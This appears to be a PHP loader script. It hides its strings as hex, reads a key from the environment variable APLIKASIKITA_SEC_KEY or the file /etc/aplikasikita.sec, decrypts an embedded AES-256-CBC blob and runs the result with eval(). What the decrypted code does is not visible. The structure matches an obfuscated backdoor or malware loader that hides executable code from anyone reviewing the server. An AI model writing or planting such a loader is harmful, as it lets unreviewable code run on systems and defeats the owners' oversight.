<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('fPQWB+lOf+X9P7+QL/+9Yw==');
$c=base64_decode(
'+UqDBu9lQT8Ucb0bAGv3q+ZvF5D2DtUDrxWbD3BqRvn9RwS6GRTJoCy5t5yyTqfdughG+E3FHvFI' .
'SOq1/xieiZLRA45khE5ydpVwAzVSr4UzzTa89NlP5p22lK4UH1ZyO6btJ53fftXjGeufbOBPxhBf' .
'Vs0bGgwn8VF4uH5et72c6AalT4dg7/ddxS1w2vzIQcepVVYDrwSAJPg8Z5VB9ccyDKrPgLmTyRD8' .
'7AgOie8hN7t6bvMduRm/O8cqS+2U9w7Yigp0PIDjKac5h8oilBNSXUqB0SnXXcfsCj0U/RGhamMi' .
'tMjWHj9ZD4D29WloHrFxfDjHEhFerLXLwX2bfjrmvdOQASOl11LBp89+GobpMxepK+CG2XDkxxLV' .
'S7s6OFrHMbOZ8Kx9UaeoufQuYtqcp+XVTvbI9G1dIXglOvUUEUln0ALFdBu6y292VHZ+jLlFJ5Az' .
'59GKAc2WeEX5YXFY5ngEBsdJaKPh/19PQiLtv80nMGK0mKCI5izvv9/zj9+GcVMTJTAWY3E4nxws' .
'b43hP9r9b+C4vztE3keZk1o='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
